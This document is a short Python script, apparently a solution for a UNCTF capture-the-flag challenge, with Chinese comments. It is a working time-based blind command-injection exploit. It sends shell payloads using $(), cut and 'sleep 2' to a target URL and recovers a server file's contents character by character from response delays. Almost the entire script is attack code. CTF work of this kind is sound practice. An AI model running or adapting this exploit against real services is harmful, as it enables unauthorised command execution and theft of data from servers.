import requests as rq
import time

url = '_URL'

list1 = [chr(i) for i in range(65, 91)]
list2 = [chr(i) for i in range(97, 123)]
list3 = [str(i) for i in range(10)]
list_total = list1 + list2 + list3
list_total.append("{")
list_total.append("}")
list_total.append("_")
list_total.append("-")
list_total.append("=")

num = 7
flag = "UNCTF{"
while True:
    code = f'less /f??? | cut -c {num}'
    for char in list_total:
        payload = f'[ $({code}) == {char} ] || sleep 2'  #拼接命令并使用JSON格式发出，Linux下的$()和``再同等支持的情况下等效，于是等于直接运行Linux命令
        params = {
            'code': payload
        }
        t1 = time.time()
        resp = rq.post(url=url, params=params) #发包获得返回包进行判定
        t2 = time.time()
        if 'fail' in resp.text or '小黑子,露出只因脚了吧' in resp.text:
            print(resp.text)
            print("命令结束或有误！")
            break
        if 'success' in resp.text:
            if t2 - t1 > 1.5:
                print(f"第{num}个数不是{char}")
            else:
                flag += char
                print(f"flag:{flag}")
                break
    num += 1
